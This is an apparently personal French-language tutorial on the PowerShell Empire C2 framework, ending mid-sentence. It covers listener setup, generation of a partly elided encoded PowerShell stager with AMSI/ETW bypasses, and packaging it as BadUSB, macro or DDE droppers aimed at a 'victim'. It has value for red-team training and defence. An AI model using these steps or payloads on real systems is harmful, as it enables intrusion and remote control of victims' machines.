
**Powershell empire** est un **framework** d'**exploitation** et de **post-exploitation** fait principalement en **powershell**.

## __Installation__

### Kali-linux

```shell
$ sudo apt install powershell-empire -y 
$ powershell-empire
```

### Github

```shell
$ sudo apt install python3-pip
$ sudo pip3 install poetry
$ git clone --recursive https://github.com/BC-SECURITY/Empire.git
$ cd Empire
$ sudo ./setup/install.sh
$ sudo poetry install
```


## __Start__

### Kali-linux

Dans un premier terminal lancer la commande :

```shell
$ powershell-empire server
```

Dans un second onglet, lancer la commande :

```shell
$ powershell-empire client
```


### Other

Dans un premier terminal lancer la commande :

```shell
$ sudo poetry run python3 empire.py server
```

Dans un second onglet, lancer la commande :

```shell
$ sudo poetry run python3 empire.py client
```


## __Usage__

### __Help__

La commande help affiche les commande et leur usage.

```shell
(Empire) > help

┌Help Options───┬──────────────────────────────────────────────────────────────────────────────────────────────────────────┬────────────────────────────────────┐
│ Name          │ Description                                                                                              │ Usage                              │
├───────────────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────┼────────────────────────────────────┤
│ admin         │ View admin menu                                                                                          │ admin                              │
├───────────────┼──────────────────────────────────────────────────────────────────────────
 ...
├───────────────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────┼────────────────────────────────────┤
│ useplugin     │ Use an Empire plugin.                                                                                    │ useplugin <plugin_name>            │
├───────────────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────┼────────────────────────────────────┤
│ usestager     │ Use an Empire stager.                                                                                    │ usestager <stager_name>            │
└───────────────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────┴────────────────────────────────────┘

```


### __Listeners__

Pour mettre en place une connection entre une machine distante et la notre, on doit mettre en place un listener.

Pour entrer dans le contexte listener, on effectue la commande :

```shell
(Empire) > listeners

┌Listeners List────────┬──────────────────────────────────────┬─────────┐
│ ID │ Name │ Template │ Created At                           │ Enabled │
└────┴──────┴──────────┴──────────────────────────────────────┴─────────┘

(Empire: listeners) >
```

#### uselistener

Pour selectionner un listener on effectue la commande **`uselistener <PROTOCOLE>`** :

```shell
(Empire: listeners) > uselistener http

 id           http                                                                  
 authors      Will Schroeder, @harmj0y, https://twitter.com/harmj0y                 
 description  Starts a http[s] listener (PowerShell or Python) that uses a GET/POST 
              approach.                                                             
 category     client_server                                                         


┌Record Options────┬─────────────────────────────────────┬──────────┬─────────────────────────────────────┐
│ Name             │ Value                               │ Required │ Description                         │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Name             │ http                                │ True     │ Name for the listener.              │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Host             │ http://192.168.106.132              │ True     │ Hostname/IP for staging.            │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ BindIP           │ 0.0.0.0                             │ True     │ The IP to bind to on the control    │
│                  │                                     │          │ server.                             │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Port             │                                     │ True     │ Port for the listener.              │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Launcher         │ powershell -noP -sta -w 1 -enc      │ True     │ Launcher string.                    │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
(...)
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ JA3_Evasion      │ False                               │ True     │ Randomly generate a JA3/S signature │
│                  │                                     │          │ using TLS ciphers.                  │
└──────────────────┴─────────────────────────────────────┴──────────┴─────────────────────────────────────┘
```

Il existe une multitude de listeners :

| **Name**           | **Description**                                                                                                                                    |
| ------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------- |
| **dbx**            | Passe par dropbox, un service cloud tiers à premiere vue neutre pour les équipes de défense. Permet de ne jamais exposer le réseau de l'attaquant. |
| **http_com**       | Mode classique sur HTTPS à travers un objet COM caché pour Internet Explorer, permettant une communication au travers de ce composant.             |
| **http_hop**       | Redirige les communications vers un autre listener                                                                                                 |
| **http_mapi**      | Protocole utilisé par les infra Microsoft Exchange (outlook poiur la messagerie), rarement supervisé dinement dans les SI.                         |
| **onedrive**       | Comme dropbox mais pour onedrive.                                                                                                                  |
| **http**           | Mode le plus simple à travers HTTP, en claire et HTTPS si l'on spécifie un certificat.                                                             |
| **http_foreign**   | A la facon de hop il permet de rediriger la communication vers un autre serveur Empire.                                                            |
| **meterpreter**    | Utilise le protocole de communication de [MSF Meterpreter](Metasploit-use_modules##__Session__)                                                    |
| **http_malleable** | Malleable est le protocole utilisé par Colbalt Strike, fréquemment utilisé en offensif, reservé pour les usages avancés.                           |
| **redirector**     | Comme le module hop mais sans la couche HTTP, il redirige vers un autre listener avec TCP.                                                                                                                                                   |

#### Option

La commande **`option`** permet d'afficher les options que prend le listener.

```shell
(Empire: uselistener/http) > options

┌Record Options────┬─────────────────────────────────────┬──────────┬─────────────────────────────────────┐
│ Name             │ Value                               │ Required │ Description                         │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Name             │ http                                │ True     │ Name for the listener.              │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Host             │ http://192.168.106.132              │ True     │ Hostname/IP for staging.            │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ BindIP           │ 0.0.0.0                             │ True     │ The IP to bind to on the control    │
│                  │                                     │          │ server.                             │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Port             │                                     │ True     │ Port for the listener.              │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Launcher         │ powershell -noP -sta -w 1 -enc      │ True     │ Launcher string.                    │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
(...)
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ SlackURL         │                                     │ False    │ Your Slack Incoming Webhook URL to  │
│                  │                                     │          │ communicate with your Slack         │
│                  │                                     │          │ instance.                           │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ JA3_Evasion      │ False                               │ True     │ Randomly generate a JA3/S signature │
│                  │                                     │          │ using TLS ciphers.                  │
└──────────────────┴─────────────────────────────────────┴──────────┴─────────────────────────────────────┘
```

#### Set

La commande **`set`** permet de spécifier une valeur pour une option.

```shell
(Empire: uselistener/http) > set Port 80
INFO: Set Port to 80 
```

#### Execute

Une fois toutes les options nécessaires spécifié, on peut démarrer notre listener avec la **`execute`**.

```shell
(Empire: uselistener/http) > execute
[+] Listener http successfully started
```


### __Dropper__

Pour telecharger notre malware sur le pc de la victime, on va utiliser un [dropper](Malware_working#__Dropper___). 

#### Usestager

Pour selectionner notre stager on utilise la commande **`usestager`**.

```shell
(Empire: uselistener/http) > usestager multi_launcher

 id           multi_launcher                                        
 authors      Will Schroeder, @harmj0y, https://twitter.com/harmj0y 
 description  Generates a one-liner stage0 launcher for Empire.     


┌Record Options────┬────────────────────┬──────────┬─────────────────────────────────────┐
│ Name             │ Value              │ Required │ Description                         │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Listener         │                    │ True     │ Listener to generate stager for.    │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Language         │ powershell         │ True     │ Language of the stager to generate. │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ StagerRetries    │ 0                  │ False    │ Times for the stager to retry       │
│                  │                    │          │ connecting.                         │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
(...)
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Proxy            │ default            │ False    │ Proxy to use for request (default,  │
│                  │                    │          │ none, or other).                    │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ ProxyCreds       │ default            │ False    │ Proxy credentials                   │
│                  │                    │          │ ([domain\]username:password) to use │
│                  │                    │          │ for request (default, none, or      │
│                  │                    │          │ other).                             │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Bypasses         │ mattifestation etw │ False    │ Bypasses as a space separated list  │
│                  │                    │          │ to be prepended to the launcher     │
└──────────────────┴────────────────────┴──────────┴─────────────────────────────────────┘

(Empire: usestager/multi_launcher) >
```

#### Set listener

Comme nous avons créer un listener HTTP, on va le selectionner.

```shell
(Empire: usestager/multi_launcher) > set Listener http
INFO: Set Listener to http 
```

#### Generate

Une fois nos options bien complété, on va generer notre payload powershell à executer sur la machine cible.

```shell
(Empire: usestager/multi_launcher) > generate
powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAJABSAGUAZgA9AFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBlAHQARgBpAGUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4A
(...)
BvAGEAZABEAGEAdABhACgAJABzAGUAcgArACQAdAApADsAJABpAHYAPQAkAGQAYQB0AGEAWwAwAC4ALgAzAF0AOwAkAGQAYQB0AGEAPQAkAGQAYQB0AGEAWwA0AC4ALgAkAGQAYQB0AGEALgBsAGUAbgBnAHQAaABdADsALQBqAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAYQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==
INFO: Stager copied to clipboard 
(Empire: usestager/multi_launcher) >
```

#### Pack

Etant donné qu'il est peu probable qu'une cible éxécute d'elle meme cette ligne de commande, on a la possibilité de l'empaqueter dans autres chose.

```shell
(Empire: uselistener/http) > usestager windows_ducky

 id           windows_ducky                                                       
 authors      Will Schroeder, @harmj0y, https://twitter.com/harmj0y               
              , @kisasondi,                                                       
 description  Generates a ducky script that runes a one-liner stage0 launcher for 
              Empire.                                                             


┌Record Options────┬─────────────┬──────────┬─────────────────────────────────────┐
│ Name             │ Value       │ Required │ Description                         │
├──────────────────┼─────────────┼──────────┼─────────────────────────────────────┤
│ Listener         │             │ True     │ Listener to generate stager for.    │
├──────────────────┼─────────────┼──────────┼─────────────────────────────────────┤
│ Language         │ powershell  │ True     │ Language of the stager to generate. │
├──────────────────┼─────────────┼──────────┼─────────────────────────────────────┤
│ Interpreter      │ powershell  │ False    │ Which interpreter do you want?      │
│                  │             │          │ (powershell or cmd)                 │
├──────────────────┼─────────────┼──────────┼─────────────────────────────────────┤
│ StagerRetries    │ 0           │ False    │ Times for the stager to retry       │
│                  │             │          │ connecting.                         │
├──────────────────┼─────────────┼──────────┼─────────────────────────────────────┤
│ OutFile          │             │ False    │ Filename that should be used for    │
│                  │             │          │ the generated output, otherwise     │
│                  │             │          │ returned as a string.               │
├──────────────────┼─────────────┼──────────┼─────────────────────────────────────┤
│ Obfuscate        │ False       │ False    │ Switch. Obfuscate the launcher      │
│                  │             │          │ powershell code, uses the           │
│                  │             │          │ ObfuscateCommand for obfuscation    │
│                  │             │          │ types. For powershell only.         │
├──────────────────┼─────────────┼──────────┼─────────────────────────────────────┤
│ ObfuscateCommand │ Token\All\1 │ False    │ The Invoke-Obfuscation command to   │
│                  │             │          │ use. Only used if Obfuscate switch  │
│                  │             │          │ is True. For powershell only.       │
├──────────────────┼─────────────┼──────────┼─────────────────────────────────────┤
│ UserAgent        │ default     │ False    │ User-agent string to use for the    │
│                  │             │          │ staging request (default, none, or  │
│                  │             │          │ other).                             │
├──────────────────┼─────────────┼──────────┼─────────────────────────────────────┤
│ Proxy            │ default     │ False    │ Proxy to use for request (default,  │
│                  │             │          │ none, or other).                    │
├──────────────────┼─────────────┼──────────┼─────────────────────────────────────┤
│ ProxyCreds       │ default     │ False    │ Proxy credentials                   │
│                  │             │          │ ([domain\]username:password) to use │
│                  │             │          │ for request (default, none, or      │
│                  │             │          │ other).                             │
└──────────────────┴─────────────┴──────────┴─────────────────────────────────────┘

(Empire: usestager/windows_ducky) > set Listener http
INFO: Set Listener to http 
```

| Stager                   | Description                                                                                                   |
| ------------------------ | ------------------------------------------------------------------------------------------------------------- |
| **windows_csharp_exe**       | Crée un code **source c#** pour Visual Studio compilable vers un **.exe**                                             |
| **windows_ducky**            | Crée un fichier **ducky script** pour les modules **badusb** (rubber ducky, flipper zero)                             |
| **windows_launcher_bat**     | Crée un fichier **script .bat**                                                                                          |
| **windows_macro**            | Crée un code de **macro** pour les fichier **office** (Word, Excel)                                                   |
| **windows_macroless_msword** | Fait appel à la fonctionnalité **DDE** dans Word qui permet d'éxecuter du code sans passer par les macros Office. |


### __Agents__

Les agents sont les machines que nous avons réussi à infe